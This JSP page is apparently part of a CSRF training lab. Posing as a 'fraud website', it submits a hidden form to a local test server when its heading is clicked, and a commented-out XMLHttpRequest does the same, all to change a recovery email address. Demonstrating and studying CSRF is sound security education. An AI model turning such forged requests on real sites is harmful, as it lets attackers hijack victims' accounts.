<%@ include file="/commonPage.jsp"%>
<html>
<head>
<title>Test CSRF</title>
</head>

<body>
	<h3>Demystify CSRF</h3>

<h4 onclick="submitRequest()">Thanks for visiting this Fraud Website, I've triggered a GET/POST request to update the recevery email address. You can check it in developer tool.</h4>
	 <form action="http://127.0.0.1:8082/painTest/result/csrf?" method="${param.method}" id="updateEmail">
		<input type="text" name="email" value="test@best.com">
		<input type="hidden" name="param" value="${param.path}">
	</form>
</body>

<script >
function submitRequest()
{
	/*var httpRequest=new XMLHttpRequest();
	//httpRequest.open("POST", "restricted/result/csrf", false);
	httpRequest.open("POST", "http://127.0.0.1:8080/painTest/result/csrf", false);
	httpRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	httpRequest.send("email=jamdagni");
	console.log(httpRequest.responseText); */
	document.getElementById("updateEmail").submit();
}
</script>

</html>